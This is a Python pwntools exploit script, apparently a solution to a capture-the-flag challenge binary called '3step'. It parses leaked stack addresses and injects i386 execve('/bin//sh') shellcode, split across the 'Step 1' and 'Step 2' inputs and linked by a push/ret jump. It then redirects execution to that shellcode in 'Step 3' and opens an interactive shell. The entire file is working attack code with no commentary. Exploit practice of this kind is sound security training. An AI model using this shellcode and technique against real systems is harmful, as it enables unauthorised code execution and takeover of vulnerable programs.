from pwn import*
context(os='linux')
context.log_level = 'DEBUG'
e =ELF("./3step")
io = process(e.path)
io.recvuntil("0x")
buf1_addr = int(io.recv(8),16)
io.recvuntil("0x")
buf_addr = int(io.recv(8),16)
jmp = asm('push {}; ret;'.format(hex(buf_addr)), arch='i386',os='linux')
io.recvuntil("Step 1:")
io.sendline("\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68"+jmp)
io.recvuntil("Step 2:")
io.sendline("\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")
io.recvuntil("Step 3:")
io.sendline(p32(buf1_addr))

#io.sendline(payload)
io.interactive()